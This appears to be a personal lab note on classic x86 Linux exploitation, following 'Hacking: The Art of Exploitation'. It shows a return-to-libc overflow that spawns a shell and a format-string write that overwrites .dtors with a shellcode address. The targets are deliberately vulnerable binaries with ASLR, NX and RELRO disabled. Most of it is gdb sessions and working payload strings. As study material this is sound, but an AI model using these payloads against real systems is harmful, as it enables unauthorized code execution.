Shawn the R0ck - Dec 30 2013
-----------------------------------
It's an example of ROP..basically yes...

shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ export BINSH="      /bin/sh"
shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ ./getenvaddr BINSH ./rop_vuln
BINSH will be at 0xbfffff7d
shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ gdb ./rop_vuln -q
Reading symbols from /home/shawn/citypw-SCFE/security/overwrite_dtors/rop_vuln...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804841f
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804841c <+0>:	push   %ebp
   0x0804841d <+1>:	mov    %esp,%ebp
   0x0804841f <+3>:	and    $0xfffffff0,%esp
   0x08048422 <+6>:	sub    $0x20,%esp
   0x08048425 <+9>:	mov    0xc(%ebp),%eax
   0x08048428 <+12>:	add    $0x4,%eax
   0x0804842b <+15>:	mov    (%eax),%eax
   0x0804842d <+17>:	mov    %eax,0x4(%esp)
   0x08048431 <+21>:	lea    0x1b(%esp),%eax
   0x08048435 <+25>:	mov    %eax,(%esp)
   0x08048438 <+28>:	call   0x8048300 <strcpy@plt>
   0x0804843d <+33>:	mov    $0x0,%eax
   0x08048442 <+38>:	leave  
   0x08048443 <+39>:	ret    
End of assembler dump.
(gdb) 
(gdb) r $(python -c 'print "A" * 21')
Starting program: /home/shawn/citypw-SCFE/security/overwrite_dtors/rop_vuln $(python -c 'print "A" * 21')

Breakpoint 1, 0x0804841f in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e9bf10 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e8f550 <exit>

shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ ./rop_vuln `python -c 'print "A" * 17 + "\x10\xbf\xe9\xb7" + "\x50\xf5\xe8\xb7" + "\x7d\xff\xff\xbf"`
-bash: command substitution: line 1: unexpected EOF while looking for matching `''
-bash: command substitution: line 2: syntax error: unexpected end of file
Segmentation fault
shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ ./rop_vuln `python -c 'print "A" * 17 + "\x10\xbf\xe9\xb7" + "\x50\xf5\xe8\xb7" + "\x7d\xff\xff\xbf"'`
$ id
uid=1000(shawn) gid=1001(shawn) groups=1001(shawn)
$ exit


--------------------------------------------------------------------------
This sample is going to show you how to overwrite the .dtors
section. You should read the book Hacking: The Art of Exploitation,
2nd Edition if you wanna know more details. Turn off the ASLR at
first:

root@bt$echo 0 > /proc/sys/kernel/randomize_va_space 

Enter the code directory and run the "make", then export the shellcode
into a file and save the shellcode onto environment variable:

shawn@bt:/tmp/overwrite_dtor$ ./gen_shellcode 
shawn@bt:/tmp/overwrite_dtor$ export SHELLCODE=$(cat shellcode.bin)

Input some test data to find the place for exploit, then we got the
4th and 5th paramenter are cool:

shawn@bt:/tmp/overwrite_dtor$ ./fmt_vuln AAAA%x-%x-%x-%x
The right way to print user-controlled input:
AAAA%x-%x-%x-%x
The wrong way to print user-controlled input:
AAAAbffff010-174-174-41414141
[*] test_val @ 0x080497e0 = -72 0xffffffb8

Get the shellcode address and calculate it:

shawn@bt:/tmp/overwrite_dtor$ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at 0xbffff6b9
shawn@bt:/tmp/overwrite_dtor$ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at 0xbffff6b9
shawn@bt:/tmp/overwrite_dtor$ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf6b9 - 0xbfff
$2 = 14010
(gdb) q

And, DTOR's address:

shawn@bt:/tmp/overwrite_dtor$ nm ./fmt_vuln | grep DTOR
080496d4 D __DTOR_END__
080496d0 d __DTOR_LIST__


shawn@bt:/tmp/overwrite_dtor$ gdb ./fmt_vuln 
GNU gdb (GDB) 7.1-ubuntu
Copyright (C) 2010 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /tmp/overwrite_dtor/fmt_vuln...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048494 <+0>:    push   %ebp
   0x08048495 <+1>:    mov    %esp,%ebp
   0x08048497 <+3>:    and    $0xfffffff0,%esp
   0x0804849a <+6>:    sub    $0x410,%esp
   0x080484a0 <+12>:   cmpl   $0x1,0x8(%ebp)
   0x080484a4 <+16>:   jg     0x80484c8 <main+52>
   0x080484a6 <+18>:   mov    0xc(%ebp),%eax
   0x080484a9 <+21>:   mov    (%eax),%edx
   0x080484ab <+23>:   mov    $0x8048620,%eax
   0x080484b0 <+28>:   mov    %edx,0x4(%esp)
   0x080484b4 <+32>:   mov    %eax,(%esp)
   0x080484b7 <+35>:   call   0x80483ac <printf@plt>
   0x080484bc <+40>:   movl   $0x0,(%esp)
   0x080484c3 <+47>:   call   0x80483cc <exit@plt>
   0x080484c8 <+52>:   mov    0xc(%ebp),%eax
   0x080484cb <+55>:   add    $0x4,%eax
   0x080484ce <+58>:   mov    (%eax),%eax
   0x080484d0 <+60>:   mov    %eax,0x4(%esp)
   0x080484d4 <+64>:   lea    0x10(%esp),%eax
   0x080484d8 <+68>:   mov    %eax,(%esp)
   0x080484db <+71>:   call   0x804839c <strcpy@plt>
   0x080484e0 <+76>:   movl   $0x804863c,(%esp)
   0x080484e7 <+83>:   call   0x80483bc <puts@plt>
   0x080484ec <+88>:   mov    $0x804866a,%eax
   0x080484f1 <+93>:   lea    0x10(%esp),%edx
   0x080484f5 <+97>:   mov    %edx,0x4(%esp)
   0x080484f9 <+101>:  mov    %eax,(%esp)
   0x080484fc <+104>:  call   0x80483ac <printf@plt>
   0x08048501 <+109>:  movl   $0x8048670,(%esp)
   0x08048508 <+116>:  call   0x80483bc <puts@plt>
   0x0804850d <+121>:  lea    0x10(%esp),%eax
   0x08048511 <+125>:  mov    %eax,(%esp)
   0x08048514 <+128>:  call   0x80483ac <printf@plt>
   0x08048519 <+133>:  movl   $0xa,(%esp)
   0x08048520 <+140>:  call   0x804837c <putchar@plt>
   0x08048525 <+145>:  mov    0x80497e0,%ecx
---Type <return> to continue, or q <return> to quit---
   0x0804852b <+151>:	      mov    0x80497e0,%edx
   0x08048531 <+157>:	      mov    $0x80486a0,%eax
   0x08048536 <+162>:	      mov    %ecx,0xc(%esp)
   0x0804853a <+166>:	      mov    %edx,0x8(%esp)
   0x0804853e <+170>:	      movl   $0x80497e0,0x4(%esp)
   0x08048546 <+178>:	      mov    %eax,(%esp)
   0x08048549 <+181>:	      call   0x80483ac <printf@plt>
   0x0804854e <+186>:	      movl   $0x0,(%esp)
   0x08048555 <+193>:	      call   0x80483cc <exit@plt>
End of assembler dump.
(gdb) b *0x08048511
Breakpoint 1 at 0x8048511
(gdb) r $(printf "\xd6\x96\x04\x08\xd4\x96\x04\x08")%49143x%4\$hn%14010x%5\$hn
Starting program: /tmp/overwrite_dtor/fmt_vuln $(printf "\xd6\x96\x04\x08\xd4\x96\x04\x08")%49143x%4\$hn%14010x%5\$hn
The right way to print user-controlled input:
Ô–%49143x%4$hn%14010x%5$hn
The wrong way to print user-controlled input:

Breakpoint 1, 0x08048511 in main ()
(gdb) x $eax
0xbfffeff0:	0x080496d6
(gdb) x 0x080496d6
0x80496d6 <__DTOR_END__+2>:	0x00000000
(gdb) x 0x080496d4
0x80496d4 <__DTOR_END__>:	0x00000000
(gdb) ni
0x08048514 in main ()
(gdb) ni
+------------------------------------------------------------+
|                                                            |
| Program running to break point!                            |
|                                                            |
|                                                            |
+------------------------------------------------------------+
0x08048519 in main ()
(gdb) x 0x080496d4
0x80496d4 <__DTOR_END__>:	0xbffff6b9   /* see, this is what you expect to be overritten */
(gdb) c
Continuing.

[*] test_val @ 0x080497e0 = -72 0xffffffb8

Program exited normally.
(gdb) 

Nou can see the result that it's nothing. I bet you are very
disappointing to the result. As you can see these compiler's option in
Makefile, that I shutted down these protections I knew, such as NX and
RELRO:

-z norelro 
-z execstack

Remember that "SHELLCODE will be at 0xbffff6b9". Let's see the result after printf():

(gdb) x 0x080496d4
0x80496d4 <__DTOR_END__>:	0xbffff6b9

I also turned off the ASLR as you've already see above. I think this
exploit should works on older version of GNU/Linux distro. Sh*! The
current gcc must be done something to memory protection. Anyone have
idea about that?

There's a great tool to check the RELRO and NX whether is disable or
not:http://tk-blog.blogspot.com/search/label/checksec.sh

You can use it to check what barries could be stuck you:

shawn@bt:/tmp/overwrite_dtor$ ./checksec.sh --file fmt_vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   fmt_vuln


If anyone could help me solve this issue, I will buy you a cup of coffee/tea.


Shawn the R0ck
Jun 1st, 2012
